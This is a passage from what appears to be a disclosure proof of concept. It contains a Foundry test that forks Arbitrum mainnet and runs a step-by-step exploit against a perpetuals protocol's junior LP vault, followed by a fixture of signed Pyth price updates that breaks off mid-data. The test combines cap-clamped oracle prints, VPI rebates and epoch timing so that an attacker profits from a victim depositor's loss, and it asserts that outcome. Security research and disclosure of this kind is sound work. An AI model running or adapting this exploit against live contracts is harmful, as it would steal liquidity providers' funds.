        console2.log("step 1 junior principal atoms", pool.juniorPrincipal());
        require(juniorVault.balanceOf(victim) > 0 && juniorVault.balanceOf(attacker) > 0, "junior deposits did not mint");
        require(engine.lastMarkPrice() == CAP_PRICE, "deposit mark was not clamped to the cap");

        console2.log("step 2 each trader margin atoms", TRADER_FUND);
        _fundTrader(skewTrader, TRADER_FUND);
        _fundTrader(offsetTrader, TRADER_FUND);

        _logPrint("step 3 open the skew short on the signed print", "short");
        uint256 skewSize = _quotedOpen(skewTrader, CfdTypes.Side.SHORT) - LOT;
        console2.log("step 3 skew short size", skewSize);
        _commitAndExecute(skewTrader, CfdTypes.Side.SHORT, skewSize, ORDER_MARGIN, CAP_PRICE, false, "short", SHORT_PREV, SHORT_PUBLISH);
        (uint256 skewLots,, uint256 skewEntry, uint256 skewMaxProfit,,, int256 skewVpi) = engine.positions(skewTrader);
        console2.log("step 3 skew lots", skewLots);
        console2.log("step 3 skew entry price", skewEntry);
        console2.log("step 3 skew max profit atoms", skewMaxProfit);
        console2.log("step 3 skew VPI atoms", uint256(skewVpi));
        require(skewLots > 0, "skew short did not open");
        require(skewEntry == CAP_PRICE, "short did not fill at the cap");
        require(skewMaxProfit == 0, "a short opened at the cap must reserve no LP cash");
        require(skewVpi > 0, "skew open must pay VPI into the pool");
        require(engine.lastMarkPrice() == CAP_PRICE, "short mark left the cap");

        console2.log("step 4 attacker redeems the junior that paid the skew VPI");
        uint256 attackerUnlock = juniorVault.lastDepositTime(attacker) + juniorVault.DEPOSIT_COOLDOWN();
        _advanceTo(attackerUnlock);
        uint256 attackerShares = juniorVault.maxRequestRedeem(attacker);
        console2.log("step 4 redeem requested shares", attackerShares);
        vm.prank(attacker);
        uint256 attackerRedeem = juniorVault.requestRedeem(attackerShares, attacker, attacker);
        require(pool.lpEpochStart(attackerRedeem) == REDEEM_EPOCH, "attacker redeem epoch moved");
        console2.log("step 4 redeem epoch", REDEEM_EPOCH);
        _logPrint("step 4 settle signed print", "redeem");
        _advanceTo(REDEEM_PUBLISH);
        _settle("redeem", REDEEM_PUBLISH);
        uint256 attackerExit = _claimRedeem(attacker, attackerRedeem);
        console2.log("step 4 attacker USDC out atoms", attackerExit);
        console2.log("step 4 pool USDC atoms", pool.totalAssets());
        console2.log("step 4 junior principal atoms", pool.juniorPrincipal());
        console2.log("step 4 victim shares still held", juniorVault.balanceOf(victim));
        require(attackerExit > 0, "attacker redeem paid nothing");
        require(juniorVault.balanceOf(victim) > 0, "victim must remain after the depth collapse");
        require(engine.terminalNavSnapshot().terminalLpPriceDeltaAssets == 0, "collapse is not a price receivable");
        require(engine.lastMarkPrice() == CAP_PRICE, "redeem mark left the cap");

        console2.log("step 5 attacker queues the dip deposit atoms", DIP_DEPOSIT);
        uint256 dipRequest = _requestDeposit(attacker, DIP_DEPOSIT);
        uint256 dipEpoch = pool.lpEpochStart(dipRequest);
        console2.log("step 5 dip epoch start", dipEpoch);
        require(dipEpoch == DIP_EPOCH, "dip deposit epoch moved");
        require(dipEpoch > vm.getBlockTimestamp(), "dip deposit must mature in a later epoch");

        _logPrint("step 6 open the offset long on the signed print", "long");
        uint256 offsetQuoted = _quotedOpen(offsetTrader, CfdTypes.Side.LONG);
        uint256 offsetSize = (offsetQuoted - LOT) * 4 / 5 / LOT * LOT;
        console2.log("step 6 offset quoted size", offsetQuoted);
        console2.log("step 6 offset size", offsetSize);
        uint256 cashBeforeRebate = pool.totalAssets();
        uint256 juniorBeforeRebate = pool.juniorPrincipal();
        console2.log("step 6 pool USDC atoms before rebate", cashBeforeRebate);
        console2.log("step 6 junior principal atoms before rebate", juniorBeforeRebate);
        _commitAndExecute(offsetTrader, CfdTypes.Side.LONG, offsetSize, ORDER_MARGIN, 1, false, "long", LONG_PREV, LONG_PUBLISH);
        uint256 rebate = cashBeforeRebate - pool.totalAssets();
        (uint256 offsetLots,, uint256 offsetEntry,,,, int256 offsetVpi) = engine.positions(offsetTrader);
        uint256 reserve = clearinghouse.vpiRebateReserveAssets(offsetTrader);
        int256 deltaAfterOpen = engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;
        console2.log("step 6 offset lots", offsetLots);
        console2.log("step 6 offset entry price", offsetEntry);
        console2.log("step 6 rebate atoms", rebate);
        console2.log("step 6 rebate whole USDC", rebate / 1e6);
        console2.log("step 6 locked reserve atoms", reserve);
        _logSigned("step 6 terminal delta atoms", deltaAfterOpen);
        require(offsetLots == offsetSize, "offset long did not fill");
        require(offsetEntry < CAP_PRICE, "long open did not take the adverse confidence shift");
        uint256 confidenceGap = (offsetLots / LOT) * (CAP_PRICE - offsetEntry);
        console2.log("step 6 adverse confidence gap atoms", confidenceGap);
        require(offsetVpi < 0, "offset open must be a rebate");
        require(rebate > uint256(skewVpi), "rebate must exceed every VPI atom the skew open paid");
        require(reserve == uint256(-offsetVpi), "rebate cash must be locked on the offset trader");
        require(deltaAfterOpen == int256(confidenceGap), "terminal delta is not the long's adverse gap");
        require(confidenceGap < rebate - uint256(skewVpi), "confidence gap covers the excess rebate");
        require(engine.lastMarkPrice() == CAP_PRICE, "long mark left the cap");

        console2.log("step 7 settle the dip epoch after the rebate");
        _logPrint("step 7 settle signed print", "dip");
        _advanceTo(DIP_PUBLISH);
        _settle("dip", DIP_PUBLISH);
        uint256 dipShares = _claimDeposit(attacker, dipRequest, DIP_DEPOSIT);
        console2.log("step 7 dip shares", dipShares);
        console2.log("step 7 junior principal atoms after mint", pool.juniorPrincipal());
        console2.log("step 7 pool USDC atoms after mint", pool.totalAssets());
        require(dipShares > 0, "dip deposit did not mint");
        require(pool.juniorPrincipal() - DIP_DEPOSIT < juniorBeforeRebate, "epoch did not absorb the rebate hole");
        require(engine.lastMarkPrice() == CAP_PRICE, "dip mark left the cap");

        console2.log("step 8 close the offset long flat at the cap");
        _logPrint("step 8 settle signed print", "close");
        _commitAndExecute(offsetTrader, CfdTypes.Side.LONG, offsetLots, 0, CAP_PRICE, true, "close", CLOSE_PREV, CLOSE_PUBLISH);
        (uint256 offsetLeft,, uint256 closeEntry,,,,) = engine.positions(offsetTrader);
        console2.log("step 8 offset size left", offsetLeft);
        console2.log("step 8 close price", closeEntry);
        console2.log("step 8 reserve left atoms", clearinghouse.vpiRebateReserveAssets(offsetTrader));
        console2.log("step 8 pool USDC atoms", pool.totalAssets());
        require(offsetLeft == 0, "close left the long open");
        require(clearinghouse.vpiRebateReserveAssets(offsetTrader) == 0, "close must return the reserve");
        require(engine.terminalNavSnapshot().terminalLpPriceDeltaAssets == 0, "close left a price receivable");
        require(engine.lastMarkPrice() == CAP_PRICE, "close mark left the cap");

        console2.log("step 9 both juniors redeem");
        uint256 finalUnlock = juniorVault.lastDepositTime(attacker) + juniorVault.DEPOSIT_COOLDOWN();
        _advanceTo(finalUnlock);
        uint256 victimShares = juniorVault.maxRequestRedeem(victim);
        uint256 dipSharesLeft = juniorVault.maxRequestRedeem(attacker);
        console2.log("step 9 victim redeem shares", victimShares);
        console2.log("step 9 attacker redeem shares", dipSharesLeft);
        vm.prank(victim);
        uint256 victimRedeem = juniorVault.requestRedeem(victimShares, victim, victim);
        vm.prank(attacker);
        uint256 dipRedeem = juniorVault.requestRedeem(dipSharesLeft, attacker, attacker);
        require(pool.lpEpochStart(victimRedeem) == FINAL_EPOCH, "victim final epoch moved");
        require(pool.lpEpochStart(dipRedeem) == FINAL_EPOCH, "attacker final epoch moved");
        _logPrint("step 9 settle signed print", "final");
        _advanceTo(FINAL_PUBLISH);
        _settle("final", FINAL_PUBLISH);
        uint256 victimOut = _claimRedeem(victim, victimRedeem);
        uint256 attackerBack = _claimRedeem(attacker, dipRedeem);
        _withdrawFree(skewTrader);
        _withdrawFree(offsetTrader);

        uint256 victimResidual = juniorVault.convertToAssets(juniorVault.balanceOf(victim));
        uint256 attackerResidual = juniorVault.convertToAssets(juniorVault.balanceOf(attacker));
        uint256 victimEconomic = victimOut + victimResidual;
        uint256 attackerIn = ATTACKER_DEPOSIT + DIP_DEPOSIT + TRADER_FUND + TRADER_FUND;
        uint256 attackerOut = IERC20(USDC).balanceOf(attacker) + IERC20(USDC).balanceOf(skewTrader)
            + IERC20(USDC).balanceOf(offsetTrader) + clearinghouse.balanceAssets(skewTrader)
            + clearinghouse.balanceAssets(offsetTrader) + attackerResidual;
        int256 terminalDelta = engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;

        console2.log("step 9 victim USDC out atoms", victimOut);
        console2.log("step 9 victim residual atoms", victimResidual);
        console2.log("step 9 victim economic atoms", victimEconomic);
        console2.log("step 9 attacker redeem atoms", attackerBack);
        console2.log("step 9 attacker in atoms", attackerIn);
        console2.log("step 9 attacker out atoms", attackerOut);
        console2.log("step 9 junior principal left atoms", pool.juniorPrincipal());
        console2.log("step 9 pool USDC left atoms", pool.totalAssets());
        _logSigned("step 9 terminal delta atoms", terminalDelta);
        console2.log("victim loss atoms", VICTIM_DEPOSIT - victimEconomic);
        console2.log("victim loss whole USDC", (VICTIM_DEPOSIT - victimEconomic) / 1e6);
        console2.log("attacker profit atoms", attackerOut - attackerIn);
        console2.log("attacker profit whole USDC", (attackerOut - attackerIn) / 1e6);
        console2.log("funds at risk atoms", VICTIM_DEPOSIT - victimEconomic);
        console2.log("USDC price used for the dollar figure is 1");

        require(victimEconomic < VICTIM_DEPOSIT, "victim junior is repaid less than principal");
        require(
            VICTIM_DEPOSIT - victimEconomic > uint256(skewVpi) + confidenceGap,
            "shortfall exceeds collected VPI plus the confidence gap"
        );
        require(attackerOut > attackerIn, "attacker is paid from that shortfall");
        require(terminalDelta == 0, "terminal price delta stays zero");
        require(engine.lastMarkPrice() == CAP_PRICE, "final mark left the cap");
    }

    function _requireBaseClampsCap() internal pure {
        _requireClamp(99_985_354, 10_339);
        _requireClamp(99_989_699, 5_193);
        _requireClamp(99_978_133, 4_428);
        _requireClamp(99_979_830, 7_082);
        _requireClamp(99_980_957, 4_993);
        _requireClamp(99_977_002, 4_334);
        _requireClamp(99_976_668, 12_200);
    }

    /// @dev Mirrors `PletherOracle` for one non-inverted expo -8 component: basket, confidence, then the
    ///      stored 2_000 bps adverse shift. The long open is the shift that moves the price down.
    function _requireClamp(uint256 price, uint256 conf) internal pure {
        uint256 weighted = price * 1e8 / BASE_PRICE;
        uint256 basketConf = weighted * conf / price;
        uint256 shift = basketConf * 2_000 / 10_000;
        require(weighted >= CAP_PRICE, "basket is below the cap");
        require(weighted - shift >= CAP_PRICE, "adverse shift falls through the cap");
        require(basketConf * 10_000 <= weighted * 10, "print confidence is wider than the launch cap");
    }

    function _forkArbitrumOne() internal {
        string memory url = "https://arbitrum.publicnode.com";
        try vm.envString("ARBITRUM_RPC_URL") returns (string memory configured) {
            if (bytes(configured).length != 0) url = configured;
        } catch {}
        vm.createSelectFork(url);
        if (block.chainid != 42_161) {
            vm.createSelectFork("https://arbitrum.publicnode.com");
        }
    }

    function _advanceTo(uint256 target) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(target >= nowTs, "fork clock only moves forward");
        if (target != nowTs) vm.warp(target);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _credit(address account, uint256 amount) internal {
        deal(USDC, account, IERC20(USDC).balanceOf(account) + amount);
        require(IERC20(USDC).balanceOf(account) >= amount, "real USDC deal failed");
    }

    function _requestDeposit(address lp, uint256 amount) internal returns (uint256 requestId) {
        _credit(lp, amount);
        vm.startPrank(lp);
        IERC20(USDC).forceApprove(address(juniorVault), amount);
        requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(address lp, uint256 requestId, uint256 amount) internal returns (uint256 shares) {
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, lp);
        console2.log("deposit claimable atoms", claimable);
        require(claimable == amount, "deposit was not funded for the requested amount");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _claimRedeem(address lp, uint256 requestId) internal returns (uint256 paid) {
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        console2.log("redeem claimable shares", claimable);
        require(claimable > 0, "redeem funded nothing");
        vm.prank(lp);
        paid = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function _fundTrader(address account, uint256 amount) internal {
        _credit(account, amount);
        vm.startPrank(account);
        IERC20(USDC).forceApprove(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
        require(clearinghouse.balanceAssets(account) == amount, "trader deposit did not credit");
    }

    function _withdrawFree(address account) internal {
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(account);
        console2.log("free margin atoms", free);
        if (free == 0) return;
        vm.prank(account);
        clearinghouse.withdraw(account, free);
    }

    function _quotedOpen(address account, CfdTypes.Side side) internal view returns (uint256 size) {
        ICfdEngineLens.MaxOpenQuote memory quote = lens.quoteMaxOpen(account, side, ORDER_MARGIN, CAP_PRICE);
        size = quote.maxSizeDelta;
        require(size >= 2 * LOT, "quote too small");
    }

    function _commitAndExecute(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose,
        string memory key,
        uint256 prevTime,
        uint256 publishTime
    ) internal returns (uint64 orderId) {
        require(publishTime == prevTime + 1, "signed print is outside the 15 second window");
        _advanceTo(prevTime);
        orderId = router.nextCommitId();
        OrderV3Types.OrderRequest memory request = _request(account, side, size, margin, targetPrice, isClose, orderId);
        vm.prank(account);
        router.commitOrder(request);
        require(router.lifecycleBook().lifecycleStatus(orderId) == OrderV3Types.LifecycleStatus.Pending, "order is not pending");
        uint256 commitTime = clock.storedCommitTime(router, orderId);
        console2.log("router order", orderId);
        console2.log("router stored commit time", commitTime);
        require(commitTime == prevTime, "stored commit time moved");
        _advanceTo(publishTime);
        require(vm.getBlockTimestamp() == publishTime, "fill is outside the 15 second window");
        bytes[] memory data = _blob(key);
        uint256 fee = oracle.getOrderExecutionFee(data);
        console2.log("router execution fee wei", fee);
        vm.deal(address(this), fee);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(orderId, data);
        console2.log("router execution status", uint256(result.status));
        console2.log("router pending reason", uint256(result.pendingReason));
        console2.log("router terminal reason", uint256(result.terminalReason));
        require(result.status == OrderV3Types.LifecycleStatus.Executed, "router order did not execute");
        require(engine.lastMarkTime() == publishTime, "fill did not use the signed publish time");
    }

    function _request(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose,
        uint64 orderId
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 deadline = vm.getBlockTimestamp() + router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("F700RealPythFork", block.chainid, address(router), account, orderId)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(deadline),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _settle(string memory key, uint256 publishTime) internal {
        require(vm.getBlockTimestamp() == publishTime, "signed print is outside the live 15 second window");
        bytes[] memory data = _blob(key);
        uint256 fee = oracle.getUpdateFee(data);
        console2.log("router settle fee wei", fee);
        vm.deal(address(this), fee);
        router.settleLpEpoch{value: fee}(data);
        console2.log("settled mark", engine.lastMarkPrice());
        console2.log("settled mark time", engine.lastMarkTime());
        require(engine.lastMarkTime() == publishTime, "settlement did not use the signed publish time");
        require(engine.lastMarkPrice() == CAP_PRICE, "settlement mark was not clamped to the cap");
    }

    function _blob(string memory key) internal view returns (bytes[] memory data) {
        data = abi.decode(vm.parseJson(vm.readFile(FIXTURE), string.concat(".prints.", key, ".updateData")), (bytes[]));
        require(data.length == 1 && data[0].length > 0, "signed Pyth blob is empty");
    }

    function _logPrint(string memory label, string memory key) internal view {
        string memory root = string.concat(".prints.", key);
        console2.log(label);
        console2.log("signed publish time", vm.parseJsonUint(vm.readFile(FIXTURE), string.concat(root, ".publish")));
        console2.log("signed previous publish time", vm.parseJsonUint(vm.readFile(FIXTURE), string.concat(root, ".prev")));
        console2.log("signed price", vm.parseJsonUint(vm.readFile(FIXTURE), string.concat(root, ".price")));
        console2.log("signed confidence", vm.parseJsonUint(vm.readFile(FIXTURE), string.concat(root, ".conf")));
        console2.log("source transaction");
        console2.logString(vm.parseJsonString(vm.readFile(FIXTURE), string.concat(root, ".tx")));
    }

    function _logSigned(string memory label, int256 value) internal pure {
        if (value < 0) {
            console2.log(label, uint256(-value));
            console2.log("sign", "-");
        } else {
            console2.log(label, uint256(value));
        }
    }

    receive() external payable {}

}
```

Signed Pyth fixture, `test/fixtures/f700/usdc-prints.json`:

```json
{
  "base": 49987114,
  "prints": {
    "deposit": {
      "price": 99985354,
      "conf": 10339,
      "publish": 1793769446,
      "prev": 1793769445,
      "tx": "0xe96649e4de9790fca5dbbe64f93720ecad3ad6c6abbc6386235e96ccbb11b00a",
      "updateData": [
        "0x504e415501000000012401000000010300f3040ae690031f68e04189e28e7d9e3702648d204d271c4f632ea615c228322721583f030bf38d858209b59762f3819dcb4c8eb79e8c3350cfaf5e7a967d545c0101c71f5d6f5b92ff1b43a07de0e3c6811186308cc0ddb485d911ffc439f022f7a1323e5ca0c185d2c137fcde06081e2bc995094f2b31953e3874af45a277710fe50004cbf8130023cc29421e9acc12e5e3de59b1b4022acf7db2d7c8e7e20945b97bfc039bb6b00f0cbc0fc8b90e8ff392691e68f481b95596b4cef2d97936c4f19778006aeabfe600000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a56fdf8004155575600000000085a56fdf800000000848340a8feeff76c876108861dd287a5fd93de6803005500ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace00000035120bb4e3000000000e3e7cddfffffff8000000006aeabfe6000000006aeabfe500000034aa2e5480000000000dddb8f50c04971246c3909751bbaf1f320050876670b5cd7a0d93a1fb8368c559da339cbf2d11c1322fa124d1460471ed55c53e9248d24181cc960549c645f668b99dd9ec08eed55ffc771faa3c9bddf6f8b736d7156c4f912f2024b9fd8fb0f51eb745b2fb31328ddbe40694a2640d484689c4edd0809a302a5c5e3d3b86542c646c9e256b873dd590d986d5f2d1d8ede1ffcefca86a4a297193538b9880db475ed8a62e0fe58f2b010f58726ee950113287b08d4cf83d34109f73c1dddcb55baa3818c6411070e0a621ad5a9bdf623334eb6b09407d28596250a7a235d697db76be9251b36189d796cde68dc543f74ced8b3182005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f5a7ca0000000000002863fffffff8000000006aeabfe6000000006aeabfe50000000005f59f16000000000000241c0cb692c3d82cf4a20f5a70a1096238f748583ba10e6f12bae8e3b393c9bfe7bb786a885648b8a76a27ca315d5e3ee65b432a278edc3e74230f66cb49d8b99dd9ec08eed55ffc771faa3c9bddf6f8b736d7156c4f912f2024b9fd8fb0f51eb745b2fb31328ddbe40694a2640d484689c4edd0809a302a5c5e3d3b86542c646c9e256b873dd590d986d5f2d1d8ede1ffcefca86a4a297193538b9880db475ed8a62e0fe58f2b010f58726ee950113287b08d4cf83d34109f73c1dddcb55baa3818c6411070e0a621ad5a9bdf623334eb6b09407d28596250a7a235d697db76be9251b36189d796cde68dc543f74ced8b31820055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f3b608000000000000295dfffffff8000000006aeabfe6000000006aeabfe50000000005f3a39500000000000028460c945662a8e956d0a83c550904c95397f515c14a406f12bae8e3b393c9bfe7bb786a885648b8a76a27ca315d5e3ee65b432a278edc3e74230f66cb49d8b99dd9ec08eed55ffc771faa3c9bddf6f8b736d7156c4f912f2024b9fd8fb0f51eb745b2fb31328ddbe40694a2640d484689c4edd0809a302a5c5e3d3b86542c646c9e256b873dd590d986d5f2d1d8ede1ffcefca86a4a297193538b9880db475ed8a62e0fe58f2b010f58726ee950113287b08d4cf83d34109f73c1dddcb55baa3818c6411070e0a621ad5a9bdf623334eb6b09407d28596250a7a235d697db76be9251b36189d796cde68dc543f74ced8b3182"
      ]
    },
    "short": {
      "price": 99989699,
      "conf": 5193,
      "publish": 1793771526,
      "prev": 1793771525,
      "tx": "0x5ba2425da6e0083f2ad63bf047127ccfffcbf7f5c3cba2592b98aa192d78230c",
      "updateData": [
        "0x504e4155010000000124010000000103008d12cddc36c5fe984f1c58ce06d7f80d73a5d61dafbf186821d9abe23bce88db4622016b7fd33557df144b9389ebb2fba209a6f14b061d6e058d5a30fdfecc1f010291e31a0888009581b1120cb0a6ff1f87213f46a6528dfa7ea47df7494e8f30d367fbefe72e6303ca94a3edde94e7b1d1e3a2418ddae116b4f33f03c9d5c5cbc300041ae279a3cf5020e758b0e70b99c737e55f6779e8cfb9854b82e0a595774076ca0f9ec1fd5267ec620395987e78570ae801dd2cd6a163c07cba7cc5c345dcfc19016aeac80600000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a57a078004155575600000000085a57a07800000000962b94b22e63d98a2c2caa67632eaeb0dc0d99fd03005500ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace0000003594163a41000000000ffd263ffffffff8000000006aeac806000000006aeac80500000034eadfbba4000000000e23f1a20c2dc697c6771baf961035e21562e254dc2829238b50a5e7b83e0e0c0910f2690c43c526b05624445b4dc1b6fde9ff7c26e57a0e6c10bb67f4a4673cbc554b0bc4d555ad6002f4d51feb056da2038a96a4b19d388c73e41b02aeb438ed9bb411f50be4d01c69eaeacaa06b1f73ca7df65214ab1d73a4484aa909c0be87af835c475488b7ed5f8112db02c97303f7e529881582f7854d4ee356a984cf9e54397b02ed805d18f77611c6a9b6e35fbd3f34b73e4bfaaf41632266b33777b6dbf11b8cca31c7f4fde467abea6d75505b0ceeb3b0c3853f08d8a5a296b3cc732919973df86e907191f129639f524f9723bc658c005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f5b8c30000000000001449fffffff8000000006aeac806000000006aeac8050000000005f5a87e0000000000001dcc0cee2c43b1184498998e4a018748a1783a7734b31863f7631f3314444afc340d5f847e5dd75435af3638432c0573cfd9eca9dc512a26b18e9584d051ab554b0bc4d555ad6002f4d51feb056da2038a96a4b19d388c73e41b02aeb438ed9bb411f50be4d01c69eaeacaa06b1f73ca7df65214ab1d73a4484aa909c0be87af835c475488b7ed5f8112db02c97303f7e529881582f7854d4ee356a984cf9e54397b02ed805d18f77611c6a9b6e35fbd3f34b73e4bfaaf41632266b33777b6dbf11b8cca31c7f4fde467abea6d75505b0ceeb3b0c3853f08d8a5a296b3cc732919973df86e907191f129639f524f9723bc658c0055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f3b29e0000000000001f0afffffff8000000006aeac806000000006aeac8050000000005f3ab8e00000000000024490c95a84489c96edd58a6f9d222112efc8555e9f7c663f7631f3314444afc340d5f847e5dd75435af3638432c0573cfd9eca9dc512a26b18e9584d051ab554b0bc4d555ad6002f4d51feb056da2038a96a4b19d388c73e41b02aeb438ed9bb411f50be4d01c69eaeacaa06b1f73ca7df65214ab1d73a4484aa909c0be87af835c475488b7ed5f8112db02c97303f7e529881582f7854d4ee356a984cf9e54397b02ed805d18f77611c6a9b6e35fbd3f34b73e4bfaaf41632266b33777b6dbf11b8cca31c7f4fde467abea6d75505b0ceeb3b0c3853f08d8a5a296b3cc732919973df86e907191f129639f524f9723bc658c"
      ]
    },
    "redeem": {
      "price": 99978133,
      "conf": 4428,
      "publish": 1793777269,
      "prev": 1793777268,
      "tx": "0x2e36baf25ccb32308bf02ae166ccdb6277d257ddec895e5ca435da64b1321053",
      "updateData": [
        "0x504e4155010000000124010000000103002498f4760728e48445ed5945aec7c5daf0367df7832667826e7c5fbf2ae19dcb073e63f9933d695cf1f1941e3d63342ea849acc0f6ef4b4da7e4e581cde78b8500010cdf83aa9da81f9ae77df6af6979dc20ec2ab7e9bccabbd0ad3c202c16d5acfb52f8daa52d4358bcc331c118078facf2867cfb33d83ff707675f57b5086c0a010102787bd0136c1ab3315c3131e0819b4f3109bd54b14a05308281e6631a8ad9e52975a1c2e05267374195c2a16af03036a3fbf08de8b577728313b759516f8864d5006aeade7500000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a596124004155575600000000085a59612400000000a6675c5963394008c8224dee85bc725bf60fed4a03005500ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace000000359af29637000000000f076909fffffff8000000006aeade75000000006aeade7400000035517da808000000000f2d433d0c856638a38b74bf5252ed48411679a88ec2655573eabac0ac83ef570e319726f83eba22b60c5e43001a157fb439ffa00d9a58a2b56043f34f9e3ee5936d1c0b15bc20331bc72fc9276b3546c9ef39fc0ed85c40e0e10e2157b1f6927ba18fa41c7caca0e954126bec054672ce7388f6d4e5bd2600b9e92895d75cbcb45649d24d74a59165935d04ca0e90301f154977f0497b7df440870ebf46b1bbeec7cafcf02d1ddedcc5a4f5728e6ebae12b2f8dd93b9faf361845457dc413b7989b7c543eac636023523fc999092c10273d8b3fc507e3c6a7f78d7aed123a9abb657c6211c4acedb9f1c83b23236e6f19701fdb1c005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f58b95000000000000114cfffffff8000000006aeade75000000006aeade740000000005f59b1200000000000018470cddb308bf8b63cb8a9bef99f1cde4baf847730a9a4387e3fce6dacccbd7a672b4f161f184a205a55853c18cc6e6b3997d93535ea2988d5ecd20da6bf56d1c0b15bc20331bc72fc9276b3546c9ef39fc0ed85c40e0e10e2157b1f6927ba18fa41c7caca0e954126bec054672ce7388f6d4e5bd2600b9e92895d75cbcb45649d24d74a59165935d04ca0e90301f154977f0497b7df440870ebf46b1bbeec7cafcf02d1ddedcc5a4f5728e6ebae12b2f8dd93b9faf361845457dc413b7989b7c543eac636023523fc999092c10273d8b3fc507e3c6a7f78d7aed123a9abb657c6211c4acedb9f1c83b23236e6f19701fdb1c0055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f396cc0000000000003adcfffffff8000000006aeade75000000006aeade740000000005f39fd20000000000002dce0cf5aeb6ffe9c0fae68485ab9d57b9d3daedd616824387e3fce6dacccbd7a672b4f161f184a205a55853c18cc6e6b3997d93535ea2988d5ecd20da6bf56d1c0b15bc20331bc72fc9276b3546c9ef39fc0ed85c40e0e10e2157b1f6927ba18fa41c7caca0e954126bec054672ce7388f6d4e5bd2600b9e92895d75cbcb45649d24d74a59165935d04ca0e90301f154977f0497b7df440870ebf46b1bbeec7cafcf02d1ddedcc5a4f5728e6ebae12b2f8dd93b9faf361845457dc413b7989b7c543eac636023523fc999092c10273d8b3fc507e3c6a7f78d7aed123a9abb657c6211c4acedb9f1c83b23236e6f19701fdb1c"
      ]
    },
    "long": {
      "price": 99979830,
      "conf": 7082,
      "publish": 1793779107,
      "prev": 1793779106,
      "tx": "0xfaecdc452e81a39f6061f81c81965ae4cff3ea9e3ecc3663ee76f7b00ba6d9db",
      "updateData": [
        "0x504e415501000000012401000000010300d92f2267eefabe7177fbe22503f1caee6b7af195e23e3c5b4a7f35493e6793e9792ad0dffb44929084ff16b42bd1300abba354764ba8a4b08dc0b638d40ed96400016a3b436e7a2705d9a1bdd7ade94c4cb3b35ce3bc418d8bcde4ec3f5b938cef69645a6559148357b096b71008aaa5ce12d26b55c9a3f064a9644104fef1e520f401044255d51ccb1615ca2b1e4e4e8572065be6b3651b7c4edf94a0f449d16df4d00655f8f3895ae65fa6ba9145755367ef67e7494be763002acda53987a3a0bc8e9a016aeae5a300000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a59f0bc004155575600000000085a59f0bc00000000afb1a48d659e744923856aae99e2c205f860fa9603005500ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace0000003590e4f0950000000011091eebfffffff8000000006aeae5a3000000006aeae5a2000000356c5fb8a0000000000f4f408f0c4b33840982e10712d164b19aeb29a74da0e75aae1b6c5e8464487b36befe35ac995d4c524b1b201984fdc9c8dd53a675071526d79f9cb651247e09ab6816331ceb8175b44bb02159cf9e02d0280fa8e3dec21fea2ffa6f4d1c45c34c77d9ae342481ae99241b9d940079f2d3493c5d4b8be3fb5238c7f2f12186febaf20faae880e2e223ecb20325387145b3054b8e64bd4262040b50169f4931543139376b030425b2ac1ddcc608cde29307375034a4bd19e131cf4b27b20c76e9d8004b686ded3da800cc9f4f3dda7672f7a1cb1fc928f5cde4691f2d1b5136c32f94707ec8437d7384b567005248c2727e0bbc4d19005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f592360000000000001baafffffff8000000006aeae5a3000000006aeae5a20000000005f597a400000000000017130c3fb2bfda5412931ac4723d70672fe7932393b8a9e37e49e2d701e52f41a6ae24d5994adc035957edbe49c52d64e869ce49a45216c51e692bbb88bd026816331ceb8175b44bb02159cf9e02d0280fa8e3dec21fea2ffa6f4d1c45c34c77d9ae342481ae99241b9d940079f2d3493c5d4b8be3fb5238c7f2f12186febaf20faae880e2e223ecb20325387145b3054b8e64bd4262040b50169f4931543139376b030425b2ac1ddcc608cde29307375034a4bd19e131cf4b2